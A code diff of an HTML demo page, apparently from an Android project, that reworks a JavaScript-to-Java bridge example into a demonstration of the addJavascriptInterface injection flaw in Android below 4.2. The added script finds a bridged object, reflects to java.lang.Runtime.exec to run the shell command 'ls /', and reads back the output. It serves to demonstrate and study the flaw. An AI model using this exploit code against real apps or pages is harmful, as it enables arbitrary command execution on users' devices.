@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
-    <title>Js与Android交互案例</title>
+    <title>演示Android4.2以下的JavascriptInterface注入漏洞</title>
     <meta name="viewport"
           content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no"/>
 </head>
@@ -10,63 +10,65 @@
 <div class="MiniWrap">
     <div class="article-detail">
         <div class="body">
-            <div class="title">Js与Android交互案例</div>
+            <div class="title">演示Android4.2以下的JavascriptInterface注入漏洞</div>
+            <p><input type="button" value="测试注入漏洞" onclick="testInjectBug();"/></p>
             <p><input type="button" value="testJsCallJava" onclick="testJsCallJava();"/></p>
-            <p><input type="button" value="testJsCallJava2" onclick="testJsCallJava2();"/></p>
+            <p><input type="button" value="finishSelf" onclick="finishSelf();"/></p>
         </div>
     </div>
 
     <script type="text/javascript">
 
-			function javaCallJs(){
-			    alert("javaCallJs success");
+            function testInjectBug(){
+			    var p = execute(["ls","/"]);
+			    console.log("++++"+p);
+			    console.log("++++"+convertStreamToString(p.getInputStream()));
 			}
 
 			function testJsCallJava(){
-			    console.log("++++fdfd1");
-			    testInject();
-			    <!--var p = execute(["ls","/"]);-->
-			    <!--console.log("++++"+p);-->
-                <!--console.log("++++"+getContents(p.getInputStream()));-->
+			    JInterface.testJsCallJava("hello",11)
 			}
 
-      function getContents(inputStream) {
-        var contents = "";
-        var b = inputStream.read();
-        console.log("++++:"+b);
-        while(b != -1) {
-            var bString = String.fromCharCode(b);
-            contents += bString;
-            b = inputStream.read();
-        }
-        return contents;
-       }
+			function finishSelf(){
+			    JInterface.finishSelf()
+			}
 
 
-       function execute(cmdArgs)
-       {
-        for (var obj in window) {
-            console.log(obj);
-            if ("getClass" in window[obj]) {
-                console.log("++++f:"+obj);
-                return window[obj].getClass().forName("java.lang.Runtime").
-                    getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);//.maxMemory();
-             }
-         }
-       }
 
-       function testInject()
-       {
-        for (var obj in window) {
-            console.log(obj);
-            if ("getClass" in window[obj]) {
-                console.log("++++f:"+obj);
-                var b = window[obj].getClass().forName("com.sw.compat.webview.Util")
-                console.log("++++b:"+b);
-                    <!--.getMethod("test",null).invoke(null,null);-->
-             }
-         }
-       }
+            function convertStreamToString(inputStream) {
+                var result = "";
+                var i = inputStream.read();
+                while(i != -1) {
+                    var tmp = String.fromCharCode(i);
+                    result += tmp;
+                    i = inputStream.read();
+                }
+                return result;
+            }
+
+
+            function execute(cmdArgs) {
+                for (var obj in window) {
+                    console.log(obj);
+                    if ("getClass" in window[obj]) {
+                        console.log("++++f:"+obj);
+                        return window[obj].getClass().forName("java.lang.Runtime").
+                            getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);//.maxMemory();
+                    }
+                }
+            }
+
+            function testInject() {
+                for (var obj in window) {
+                    console.log(obj);
+                    if ("getClass" in window[obj]) {
+                        console.log("++++f:"+obj);
+                        var b = window[obj].getClass().forName("com.sw.compat.webview.Util")
+                        console.log("++++b:"+b);
+                        <!--.getMethod("test",null).invoke(null,null);-->
+                    }
+                }
+            }
 
 
     </script>
